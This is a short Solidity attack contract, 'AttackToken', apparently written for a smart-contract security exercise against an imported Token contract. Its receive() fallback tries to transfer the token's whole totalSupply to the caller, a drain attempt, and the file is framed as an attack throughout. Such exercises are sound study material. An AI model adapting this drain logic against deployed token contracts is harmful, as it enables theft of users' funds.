// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0; 
import './Token.sol';
contract AttackToken {
    Token public immutable token;

    constructor(address _tokenContract) {
        token = Token(_tokenContract);
    }

    function transfer(uint256 _value) public returns (bool) {
        token.transfer(msg.sender, _value);
        return true;
    }

    receive() external payable {
        uint256 totalSupply = token.totalSupply();
        token.transfer(msg.sender, totalSupply);
    }
}
